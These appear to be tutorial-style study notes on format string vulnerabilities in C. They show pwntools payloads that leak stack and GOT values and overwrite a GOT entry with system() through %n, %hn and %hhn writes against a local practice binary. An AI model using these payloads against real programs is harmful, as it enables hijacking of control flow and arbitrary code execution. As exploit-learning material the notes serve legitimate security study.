# Format string 

```py
// Normal - safe
printf("%s", user_input);

// Vulnerable - directly using input as format string
printf(user_input);
```

```py
# Example: Overwriting printf's GOT entry to call system()
# Let's say printf's GOT entry is at 0x404018

# Writing using format string:
payload = f"%{system_addr}c%7$n"  # If parameter 7 points to GOT entry
# OR more commonly, need to write byte by byte:
payload = f"%{byte1}c%7$hhn"      # Write first byte
payload += f"%{byte2}c%8$hhn"     # Write second byte
# etc...
```

```
payload = p64(got_addr) + b"%7$s"  # If param 7 is where your input starts
# Now param 7 points to GOT because you put that address at start of your input
```


## Direct indexing with $
```c
// Normal way:
"%p.%p.%p"  // Reads 1st, 2nd, 3rd values

// With direct indexing:
"%1$p"      // Reads 1st value
"%2$p"      // Reads 2nd value
"%6$p"      // Reads 6th value

// So when we do:
"AAAAAAAA%6$p"
// We're saying: print AAAAAAAA, then print 6th parameter
// The AAAAAAAA at start doesn't affect which parameter we read
```

```py
# This printf:
printf("AAA.%p.%p.%p")
# Might output: AAA.0x100.0x200.0x300

# This vulnerable printf:
printf("AAAAAAAA%3$p")
# Is equivalent to reading 3rd value, regardless of AAAAAAAA
# Might output: AAAAAAAA0x200

# The AAAAAAAA at start is just printed literally
# The %3$p says "read 3rd parameter" specifically
# Send this:
payload = b"AAAA.%p.%p.%p.%p.%p.%p"

# Might see output like:
# AAAA.0x7ffd4857f4e0(saved rbp).0x4006d1(ret addr).0x7ffd4857f4e8(stack ptr).0x41414141(our AAAA).etc
```


## Stack layout 
```c
void vulnerable(char* input) {
    printf(input);    // vulnerable
}

// When printf(input) runs, stack might look like:
Higher addresses
[... old data ...]
[return addr to main]
[saved rbp         ]
[input ptr         ] <- printf starts reading format parameters from here
[our "AAAA%p%p"    ] <- our actual input buffer
Lower addresses
```



# full example 
```py
from pwn import *

# Example of leaking from GOT
p = process('./vuln')
elf = ELF('./vuln')

# 1. Find offset where our input is
p.sendline(b"AAAAAAAA" + b".%p" * 10)
# Look in output for 0x4141414141414141

# 2. Once we know offset (say 6), we can read GOT
got_puts = elf.got['puts']
payload = p64(got_puts) + b"%6$s"
# This reads content at got_puts address

# 3. To write to GOT:
system_addr = 0x7ffff7e4e410  # example address
payload = p64(got_puts)       # address to write to
payload += f"%{system_addr}c%6$n".encode()  # write this value
```


# %n
```c
int count = 0;
printf("AAAA%n", &count);
// count will be 4, because 4 chars were printed before %n
```
used maliciously 
```python
payload = b"A" * 0x41414141 + b"%6$n"

# When this runs:
# 1. Prints 0x41414141 'A' characters
# 2. %6$n finds address at 6th parameter
# 3. Writes 0x41414141 (number of chars printed) to that address

# like using address as counter
```
## byte-by-byte writing
```py
# %n   - writes 4 bytes
# %hn  - writes 2 bytes
# %hhn - writes 1 byte

# To write 0x41 to an address:
payload = b"A" * 0x41 + b"%6$hhn"
# Prints 0x41 'A's, then writes 0x41 to address
```

## Example 
```py
system_addr = 0x7ffff7e4e410  # Let's say we want to write this value
payload = p64(got_puts)       # First put the destination address (GOT entry of puts)

# Now we need to write 0x7ffff7e4e410 to that address
# %c prints a character and increments the counter
# %100c would print 100 spaces/chars

# So if we do:
payload += f"%{system_addr}c%6$n".encode()
# This means:
# 1. Print system_addr number of chars (using spaces)
# 2. Then %6$n will write that count to the address we placed first

# Example with smaller numbers for clarity:
# Let's say we want to write value 65 (0x41)
payload = p64(target_addr)    # Where to write
payload += "%65c%6$n"        # Print 65 chars, then write 65 to target_addr
```

```py
# Stack when printf runs:
[... stack ...]
[saved stuff    ]
[format ptr     ] <- printf starts here
[target_addr    ] <- our p64(got_puts) goes here (might be param 6)
[... more stack ]

# %6$n says "write to the 6th parameter"
# Which is where we put our target address
# to determine which parameter it is, perhaps print something first and see where
# input ends up. 
# Or how many parameters printf already has on the stack 
```
